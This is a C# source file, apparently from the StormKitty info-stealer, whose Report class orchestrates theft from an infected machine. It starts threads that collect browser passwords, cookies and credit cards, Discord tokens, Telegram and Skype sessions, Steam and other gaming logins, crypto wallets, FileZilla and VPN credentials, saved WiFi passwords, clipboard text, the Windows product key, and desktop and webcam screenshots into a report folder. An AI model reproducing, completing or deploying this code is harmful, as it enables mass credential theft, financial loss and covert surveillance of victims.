using System;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using StormKitty;

namespace Stealer
{
    internal sealed class Report
    {
        public static bool CreateReport(string sSavePath)
        {
            // List with threads
            List <Thread> Threads = new List<Thread>();
            try
            {
                // Collect files (documents, databases, images, source codes)
                if (Config.GrabberModule == "1")
                    Threads.Add(new Thread(() =>
                        FileGrabber.Run(sSavePath + "\\Grabber")
                    ));

                // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                Threads.Add(new Thread(() =>
                {
                    Chromium.Recovery.Run(sSavePath + "\\Browsers");
                    Edge.Recovery.Run(sSavePath + "\\Browsers");
                }));
                // Firefox thread (logins.json, db files, cookies, history, bookmarks)
                Threads.Add(new Thread(() =>
                    Firefox.Recovery.Run(sSavePath + "\\Browsers")
                ));
                // Internet explorer thread (logins)
                Threads.Add(new Thread(() =>
                    InternetExplorer.Recovery.Run(sSavePath + "\\Browsers")
                ));

                // Write discord tokens
                Threads.Add(new Thread(() =>
                    Discord.WriteDiscord(
                        Discord.GetTokens(),
                        sSavePath + "\\Messenger\\Discord")
                ));

                // Write pidgin accounts
                Threads.Add(new Thread(() =>
                    Pidgin.Get(sSavePath + "\\Messenger\\Pidgin")
                ));

                // Write outlook accounts
                Threads.Add(new Thread(() =>
                    Outlook.GrabOutlook(sSavePath + "\\Messenger\\Outlook")
                ));

                // Write telegram session
                Threads.Add(new Thread(() =>
                    Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
                ));

                // Write skype session
                Threads.Add(new Thread(() =>
                    Skype.GetSession(sSavePath + "\\Messenger\\Skype")
                ));

                // Steam & Uplay sessions collection
                Threads.Add(new Thread(() =>
                {
                    // Write steam session
                    Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
                    // Write uplay session
                    Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
                    // Write battle net session
                    BattleNET.GetBattleNETSession(sSavePath + "\\Gaming\\BattleNET");
                }));

                // Minecraft collection
                Threads.Add(new Thread(() =>
                    Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft")
                ));

                // Write wallets
                Threads.Add(new Thread(() =>
                    Wallets.GetWallets(sSavePath + "\\Wallets")
                ));

                // Write FileZilla
                Threads.Add(new Thread(() =>
                    FileZilla.WritePasswords(sSavePath + "\\FileZilla")
                ));

                // Write VPNs
                Threads.Add(new Thread(() =>
                {
                    ProtonVPN.Save(sSavePath + "\\VPN\\ProtonVPN");
                    OpenVPN.Save(sSavePath + "\\VPN\\OpenVPN");
                    NordVPN.Save(sSavePath + "\\VPN\\NordVPN");
                }));

                // Get directories list
                Threads.Add(new Thread(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));

                // Create directory to save system information
                Directory.CreateDirectory(sSavePath + "\\System");

                // Process list & active windows list
                Threads.Add(new Thread(() =>
                {
                    // Write process list
                    ProcessList.WriteProcesses(sSavePath + "\\System");
                    // Write active windows titles
                    ActiveWindows.WriteWindows(sSavePath + "\\System");
                }));

                // Desktop & Webcam screenshot
                Thread dwThread = new Thread(() =>
                {
                    // Create dekstop screenshot
                    DesktopScreenshot.Make(sSavePath + "\\System");
                    // Create webcam screenshot
                    WebcamScreenshot.Make(sSavePath + "\\System");
                });
                dwThread.SetApartmentState(ApartmentState.STA);
                Threads.Add(dwThread);

                // Saved wifi passwords
                Threads.Add(new Thread(() =>
                {
                    // Fetch saved WiFi passwords
                    Wifi.SavedNetworks(sSavePath + "\\System");
                    // Fetch all WiFi networks with BSSID
                    Wifi.ScanningNetworks(sSavePath + "\\System");
                }
                ));;
                // Windows product key
                Threads.Add(new Thread(() =>
                    // Write product key
                    File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                        ProductKey.GetWindowsProductKeyFromRegistry())
                ));
                // Debug logs
                Threads.Add(new Thread(() =>
                    Logging.Save(sSavePath + "\\System\\Debug.txt")
                ));
                // System info
                Threads.Add(new Thread(() =>
                    SysInfo.Save(sSavePath + "\\System\\Info.txt")
                ));
                // Clipboard text
                Threads.Add(new Thread(() =>
                    File.WriteAllText(sSavePath + "\\System\\Clipboard.txt",
                        Clipper.Clipboard.GetText())
                ));
                // Get installed apps
                Threads.Add(new Thread(() =>
                    InstalledApps.WriteAppsList(sSavePath + "\\System")
                ));

                // Start all threads
                foreach (Thread t in Threads)
                    t.Start();

                // Wait all threads
                foreach (Thread t in Threads)
                    t.Join();

                return Logging.Log("Report created", true);
            }
            catch (Exception ex) {
                return Logging.Log("Failed to create report, error:\n" + ex, false);
            }
        }
    }
}
